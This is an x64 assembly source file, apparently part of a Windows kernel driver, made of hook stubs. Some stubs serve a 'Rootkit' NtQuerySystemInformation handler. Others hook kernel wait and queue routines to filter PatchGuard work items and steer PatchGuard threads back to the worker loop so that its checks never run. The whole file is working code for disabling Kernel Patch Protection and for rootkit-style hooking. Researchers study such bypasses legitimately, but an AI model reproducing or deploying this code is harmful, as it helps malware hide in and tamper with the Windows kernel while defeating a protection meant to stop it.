;
; This module implements the lowest part of hook handlers
;
include common.inc

EXTERN Win8HandleKiCommitThreadWait : PROC
EXTERN Win8HandleKiAttemptFastRemovePriQueue : PROC
EXTERN Win8HandlePg_IndependentContextWorkItemRoutine : PROC
EXTERN Win8HandleKeDelayExecutionThread : PROC
EXTERN Win8HandleKeWaitForSingleObject : PROC


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.CONST


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.DATA


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.CODE

;
; Note:
;   xxxEnd function is used to measure the function size whose name is xxx.
;

;
; Post-NtQuerySystemInformation handler. It gets called when a high level
; handler RootkitNtQuerySystemInformation tries to call the original code.
;
; For Win 8.1 and 7
AsmNtQuerySystemInformation_Win8_1 PROC
    push    rbx
    sub     rsp, 30h
    mov     r11d, r8d
    mov     rbx, rdx
    mov     r10d, ecx
    cmp     ecx, 53h
    JMP_TEMPLATE
AsmNtQuerySystemInformation_Win8_1 ENDP
AsmNtQuerySystemInformation_Win8_1End PROC
    nop
AsmNtQuerySystemInformation_Win8_1End ENDP


; For Win Vista
AsmNtQuerySystemInformation_WinVista PROC
    mov     qword ptr[rsp + 8], rbx
    mov     qword ptr[rsp + 10h], rsi
    mov     qword ptr[rsp + 20h], r9
    push    rdi
    push    r12
    JMP_TEMPLATE
AsmNtQuerySystemInformation_WinVista ENDP
AsmNtQuerySystemInformation_WinVistaEnd PROC
    nop
AsmNtQuerySystemInformation_WinVistaEnd ENDP


; For Win XP
AsmNtQuerySystemInformation_WinXp PROC
    mov     rax, rsp
    sub     rsp, 2E8h
    mov     qword ptr[rax + 8], rbx
    mov     qword ptr[rax + 10h], rsi
    JMP_TEMPLATE
AsmNtQuerySystemInformation_WinXp ENDP
AsmNtQuerySystemInformation_WinXpEnd PROC
    nop
AsmNtQuerySystemInformation_WinXpEnd ENDP


; This function is executed from the end of KiCommitThreadWait to filter
; PatchGuard related Work Items saved in RDI.
AsmKiCommitThreadWait_16452 PROC
    PUSH_ALL_GENERAL_REGISTERS
    mov     rcx, rdi
    sub     rsp, 28h
    call    Win8HandleKiCommitThreadWait
    add     rsp, 28h
    POP_ALL_GENERAL_REGISTERS
    ; Do the same things as original return code of KiCommitThreadWait
    mov     rax, rdi
    mov     r12, qword ptr[rsp + 68h]
    add     rsp, 20h
    pop     r15
    pop     r14
    pop     r13
    pop     rdi
    pop     rsi
    pop     rbp
    pop     rbx
    ret
AsmKiCommitThreadWait_16452 ENDP
AsmKiCommitThreadWait_16452End PROC
    nop
AsmKiCommitThreadWait_16452End ENDP


AsmKiCommitThreadWait_17041 PROC    ; Also compatible with 17085
    PUSH_ALL_GENERAL_REGISTERS
    mov     rcx, rdi
    sub     rsp, 28h
    call    Win8HandleKiCommitThreadWait
    add     rsp, 28h
    POP_ALL_GENERAL_REGISTERS
    ; Do the same things as original return code of KiCommitThreadWait
    mov     rax, rdi
    mov     r15, qword ptr[rsp+88h]
    add     rsp, 40h
    pop     r14
    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbp
    pop     rbx
    ret
AsmKiCommitThreadWait_17041 ENDP
AsmKiCommitThreadWait_17041End PROC
    nop
AsmKiCommitThreadWait_17041End ENDP


; This function is executed from the end of KiAttemptFastRemovePriQueue to
; filter PatchGuard related Work Items saved in RDX.
AsmKiAttemptFastRemovePriQueue PROC
    PUSH_ALL_GENERAL_REGISTERS
    mov     rcx, rdx
    sub     rsp, 28h
    call    Win8HandleKiAttemptFastRemovePriQueue
    add     rsp, 28h
    POP_ALL_GENERAL_REGISTERS
    ; Do the same things as original return code of KiAttemptFastRemovePriQueue
    mov     rbx, qword ptr[rsp + 40h]
    mov     rbp, qword ptr[rsp + 48h]
    mov     rsi, qword ptr[rsp + 50h]
    mov     rax, rdx
    add     rsp, 30h
    pop     rdi
    ret
AsmKiAttemptFastRemovePriQueue ENDP
AsmKiAttemptFastRemovePriQueueEnd PROC
    nop
AsmKiAttemptFastRemovePriQueueEnd ENDP


; This function is executed from the beginning of
; Pg_IndependentContextWorkItemRoutine to modify this PatchGuard context.
AsmPg_IndependentContextWorkItemRoutine PROC
    PUSH_ALL_GENERAL_REGISTERS
    sub     rsp, 28h
    call    Win8HandlePg_IndependentContextWorkItemRoutine
    add     rsp, 28h
    POP_ALL_GENERAL_REGISTERS
    ; Do the same things as original code of Pg_IndependentContextWorkItemRoutine
    mov     r8, qword ptr gs : [188h]
    mov     rax, qword ptr[rcx + 18h]
    mov     rdx, qword ptr[rax + 5B0h]
    JMP_TEMPLATE
AsmPg_IndependentContextWorkItemRoutine ENDP
AsmPg_IndependentContextWorkItemRoutineEnd PROC
    nop
AsmPg_IndependentContextWorkItemRoutineEnd ENDP


; Do the same things as original return code of KeDelayExecutionThread
RETURN_CODE_OF_KeDelayExecutionThread MACRO
    mov     rbx, qword ptr[rsp + 80h]
    add     rsp, 40h
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbp
ENDM


; This function is executed from the end of KeDelayExecutionThread to catch
; a thread that is going to return to PatchGuard code.
AsmKeDelayExecutionThread PROC
    PUSH_ALL_GENERAL_REGISTERS
    lea     rcx, [rsp + 100h]   ; RCX <= address containing a return address
    sub     rsp, 28h
    call    Win8HandleKeDelayExecutionThread
    add     rsp, 28h
    dec     rax
    jz      ReturningToPg_SelfEncryptWaitAndDecrypt ; if (RAX == 1) goto
    dec     rax
    jz      ReturningToFsRtlMdlReadCompleteDevEx    ; if (RAX == 2) goto
    ; This is not a PatchGuard context, so let it return.
    POP_ALL_GENERAL_REGISTERS
    RETURN_CODE_OF_KeDelayExecutionThread
    ret             ; Does RET as usual

ReturningToPg_SelfEncryptWaitAndDecrypt:
    ; This thread is going to return to Pg_SelfEncryptWaitAndDecrypt, so we
    ; emulate code in order to return to ExpWorkerThread.
    POP_ALL_GENERAL_REGISTERS
    RETURN_CODE_OF_KeDelayExecutionThread
    add     rsp, 8  ; Does not RET since it is PatchGuard context

    ; Do the same things as original return code of Pg_SelfEncryptWaitAndDecrypt
    mov     rbx, qword ptr[rsp + 60h]
    add     rsp, 20h
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbp
    add     rsp, 8  ; Does not RET since it is PatchGuard context

    ; Execute return code of FsRtlMdlReadCompleteDevEx since
    ; Pg_SelfEncryptWaitAndDecrypt is called from FsRtlMdlReadCompleteDevEx
    jmp     AsmpReturnFromFsRtlMdlReadCompleteDevEx

ReturningToFsRtlMdlReadCompleteDevEx:
    ; This thread is going to return to FsRtlMdlReadCompleteDevEx, so we
    ; emulate code in order to return to ExpWorkerThread.
    POP_ALL_GENERAL_REGISTERS
    RETURN_CODE_OF_KeDelayExecutionThread
    add     rsp, 8  ; Does not RET since it is PatchGuard context
    jmp     AsmpReturnFromFsRtlMdlReadCompleteDevEx
AsmKeDelayExecutionThread ENDP
AsmKeDelayExecutionThreadEnd PROC
    nop
AsmKeDelayExecutionThreadEnd ENDP


; Do the same things as original return code of KeWaitForSingleObject
RETURN_CODE_OF_KeWaitForSingleObject_16452 MACRO
    add     rsp, 58h
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbp
    pop     rbx
ENDM

RETURN_CODE_OF_KeWaitForSingleObject_17041 MACRO    ; Also compatible with 17085
    add     rsp, 48h
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbp
    pop     rbx
ENDM


; This function is executed from the end of KeWaitForSingleObject to catch
; a thread that is going to return to PatchGuard code.
AsmKeWaitForSingleObject_16452 PROC
    PUSH_ALL_GENERAL_REGISTERS
    lea     rcx, [rsp + 120h]
    sub     rsp, 28h
    call    Win8HandleKeWaitForSingleObject
    add     rsp, 28h
    test    rax, rax
    jnz     ReturningToFsRtlMdlReadCompleteDevEx    ; if (RAX) goto
    ; This is not a PatchGuard context, so let it return.
    POP_ALL_GENERAL_REGISTERS
    RETURN_CODE_OF_KeWaitForSingleObject_16452
    ret             ; Does RET as usual

ReturningToFsRtlMdlReadCompleteDevEx:
    ; This thread is going to return to FsRtlMdlReadCompleteDevEx, so we
    ; emulate code in order to return to ExpWorkerThread.
    POP_ALL_GENERAL_REGISTERS
    RETURN_CODE_OF_KeWaitForSingleObject_16452
    add     rsp, 8  ; Does not RET since it is PatchGuard context
    jmp     AsmpReturnFromFsRtlMdlReadCompleteDevEx
AsmKeWaitForSingleObject_16452 ENDP
AsmKeWaitForSingleObjectEnd_16452 PROC
    nop
AsmKeWaitForSingleObjectEnd_16452 ENDP


AsmKeWaitForSingleObject_17041 PROC     ; Also compatible with 17085
    PUSH_ALL_GENERAL_REGISTERS
    lea     rcx, [rsp + 110h]
    sub     rsp, 28h
    call    Win8HandleKeWaitForSingleObject
    add     rsp, 28h
    test    rax, rax
    jnz     ReturningToFsRtlMdlReadCompleteDevEx    ; if (RAX) goto
    ; This is not a PatchGuard context, so let it return.
    POP_ALL_GENERAL_REGISTERS
    RETURN_CODE_OF_KeWaitForSingleObject_17041
    ret             ; Does RET as usual

ReturningToFsRtlMdlReadCompleteDevEx:
    ; This thread is going to return to FsRtlMdlReadCompleteDevEx, so we
    ; emulate code in order to return to ExpWorkerThread.
    POP_ALL_GENERAL_REGISTERS
    RETURN_CODE_OF_KeWaitForSingleObject_17041
    add     rsp, 8  ; Does not RET since it is PatchGuard context
    jmp     AsmpReturnFromFsRtlMdlReadCompleteDevEx
AsmKeWaitForSingleObject_17041 ENDP
AsmKeWaitForSingleObjectEnd_17041 PROC
    nop
AsmKeWaitForSingleObjectEnd_17041 ENDP


; This function returns a PatchGuard thread to ExpWorkerThread by emulating
; return code of FsRtlMdlReadCompleteDevEx and Pg_FsRtlUninitializeSmallMcb
AsmpReturnFromFsRtlMdlReadCompleteDevEx PROC
    ; Do the same things as original return code of FsRtlMdlReadCompleteDevEx
    mov     rax, r12
    lea     r11, [rsp + 0A40h]
    mov     rbx, qword ptr[r11 + 38h]
    mov     rsi, qword ptr[r11 + 40h]
    mov     rdi, qword ptr[r11 + 48h]
    mov     rsp, r11
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rbp
    add     rsp, 8  ; Does not RET since it is PatchGuard context

    ; Do the same things as original return code of FsRtlUninitializeSmallMcb
    add     rsp, 48h
    ret             ; Now this thread will return to ExpWorkerThread
AsmpReturnFromFsRtlMdlReadCompleteDevEx ENDP


END

